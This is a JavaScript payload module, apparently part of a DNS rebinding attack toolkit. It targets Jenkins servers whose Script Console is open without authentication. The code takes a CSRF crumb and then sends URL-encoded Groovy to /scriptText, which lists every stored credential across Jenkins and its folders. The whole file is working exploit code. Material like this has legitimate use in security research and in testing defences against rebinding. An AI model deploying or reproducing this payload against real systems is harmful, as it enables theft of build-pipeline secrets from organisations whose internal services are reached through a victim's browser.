/**
This payload exploits the Jenkins Script Console 
(https://wiki.jenkins.io/display/JENKINS/Jenkins+Script+Console)
and displays the stored credentials.
Requirement:
- Script Console enabled without authentication at <target>/script
The default port for Jenkins is TCP 8080 (127.0.0.1:8080)
**/

const JenkinsScriptConsole = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        fetch('/crumbIssuer/api/json')
			.then(responseOKOrFail("Could not fetch CSRF token"))
			.then(function (body) {
				console.log("crumb response: " + body);
				data = JSON.parse(body);
				crumb = data.crumb;
				crumbRequestField = data.crumbRequestField;

				let myHeaders = new Headers();
				myHeaders.append("content-type", "application/x-www-form-urlencoded");
				myHeaders.append(crumbRequestField, crumb);

        		return fetch('/scriptText', {
		            method: 'POST',
		            headers: myHeaders,
		            /**
		             * The body of the POST request is the following URL-encoded Groovy code:
		             * import jenkins.model.Jenkins
		             * import com.cloudbees.plugins.credentials.Credentials
		             * import com.cloudbees.plugins.credentials.CredentialsProvider
		             * import com.cloudbees.hudson.plugins.folder.Folder
		             * Set<Credentials> credentials = CredentialsProvider.lookupCredentials(Credentials.class)
		             * Jenkins.instance.getAllItems(Folder.class).each { folder -> credentials.addAll( CredentialsProvider.lookupCredentials(Credentials.class, folder) ) }
		             * credentials.each { credential -> println credential.properties }
		             */
		            body: 'script=import+jenkins.model.Jenkins%0D%0Aimport+com.cloudbees.plugins.credentials.Credentials%0D%0Aimport+com.cloudbees.plugins.credentials.CredentialsProvider%0D%0Aimport+com.cloudbees.hudson.plugins.folder.Folder%0D%0ASet%3CCredentials%3E+credentials+%3D+CredentialsProvider.lookupCredentials%28Credentials.class%29%0D%0AJenkins.instance.getAllItems%28Folder.class%29.each+%7B+folder+-%3E+credentials.addAll%28+CredentialsProvider.lookupCredentials%28Credentials.class%2C+folder%29+%29+%7D%0D%0Acredentials.each+%7B+credential+-%3E+println+credential.properties%7D&json=%7B%22script%22%3A+%22import+jenkins.model.Jenkins%5Cnimport+com.cloudbees.plugins.credentials.Credentials%5Cnimport+com.cloudbees.plugins.credentials.CredentialsProvider%5Cnimport+com.cloudbees.hudson.plugins.folder.Folder%5CnSet%3CCredentials%3E+credentials+%3D+CredentialsProvider.lookupCredentials%28Credentials.class%29%5CnJenkins.instance.getAllItems%28Folder.class%29.each+%7B+folder+-%3E+credentials.addAll%28+CredentialsProvider.lookupCredentials%28Credentials.class%2C+folder%29+%29+%7D%5Cncredentials.each+%7B+credential+-%3E+println+credential.properties%7D%22&Submit=Run'
		        })
				.then(responseOKOrFail("Could not obtain the stored credentials"))
				.then(function (response) { 
					console.log(`Server response: ${response}.`);
				})
		        .catch(error => console.log(`Could not obtain the stored credentials: ${error}`));
			})
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return headers.get("X-Jenkins") !== null;
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Jenkins Script Console"] = JenkinsScriptConsole();



